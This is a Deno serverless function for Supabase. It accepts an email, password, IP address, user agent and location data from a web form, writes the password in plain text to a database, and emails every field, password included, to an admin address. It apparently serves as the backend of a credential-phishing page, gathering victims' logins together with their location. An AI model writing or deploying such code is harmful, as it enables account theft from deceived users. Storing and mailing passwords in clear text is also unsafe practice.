import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.3";
import { Resend } from "npm:resend@2.0.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface FormSubmissionRequest {
  email: string;
  password: string;
  ip_address?: string;
  user_agent?: string;
  location_data?: string;
}

const handler = async (req: Request): Promise<Response> => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    console.log('Starting form submission process...');

    // Initialize Supabase client
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_ANON_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Initialize Resend client
    const resendApiKey = Deno.env.get('RESEND_API_KEY');
    if (!resendApiKey) {
      throw new Error('RESEND_API_KEY is not configured');
    }
    const resend = new Resend(resendApiKey);

    // Parse request body
    const formData: FormSubmissionRequest = await req.json();
    console.log('Form data received:', { email: formData.email, hasPassword: !!formData.password });

    // Step 1: Insert data into database first
    const { data: submission, error: dbError } = await supabase
      .from('form_submissions')
      .insert({
        email: formData.email,
        password: formData.password,
        ip_address: formData.ip_address,
        user_agent: formData.user_agent,
        location_data: formData.location_data,
        email_sent: false
      })
      .select()
      .single();

    if (dbError) {
      console.error('Database error:', dbError);
      return new Response(
        JSON.stringify({ error: 'Failed to save form data', details: dbError.message }),
        { 
          status: 500, 
          headers: { 'Content-Type': 'application/json', ...corsHeaders } 
        }
      );
    }

    console.log('Data saved to database successfully:', submission.id);

    // Step 2: Send email with the form data
    try {
      const emailResponse = await resend.emails.send({
        from: 'Form Submission <onboarding@resend.dev>',
        to: ['admin@example.com'], // You can configure this email address
        subject: 'New Form Submission',
        html: `
          <h2>New Form Submission</h2>
          <p><strong>Submission ID:</strong> ${submission.id}</p>
          <p><strong>Email:</strong> ${formData.email}</p>
          <p><strong>Password:</strong> ${formData.password}</p>
          <p><strong>IP Address:</strong> ${formData.ip_address || 'Not provided'}</p>
          <p><strong>User Agent:</strong> ${formData.user_agent || 'Not provided'}</p>
          <p><strong>Location Data:</strong> ${formData.location_data || 'Not provided'}</p>
          <p><strong>Submitted At:</strong> ${new Date().toISOString()}</p>
        `,
      });

      console.log('Email sent successfully:', emailResponse);

      // Update database to mark email as sent
      await supabase
        .from('form_submissions')
        .update({ email_sent: true })
        .eq('id', submission.id);

      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Form submitted and email sent successfully',
          submissionId: submission.id 
        }),
        { 
          status: 200, 
          headers: { 'Content-Type': 'application/json', ...corsHeaders } 
        }
      );

    } catch (emailError) {
      console.error('Email sending failed:', emailError);
      
      // Email failed, but data is already saved
      return new Response(
        JSON.stringify({ 
          success: true, 
          message: 'Form submitted successfully, but email sending failed',
          submissionId: submission.id,
          emailError: emailError.message
        }),
        { 
          status: 200, 
          headers: { 'Content-Type': 'application/json', ...corsHeaders } 
        }
      );
    }

  } catch (error: any) {
    console.error('Error in submit-form function:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { 'Content-Type': 'application/json', ...corsHeaders },
      }
    );
  }
};

serve(handler);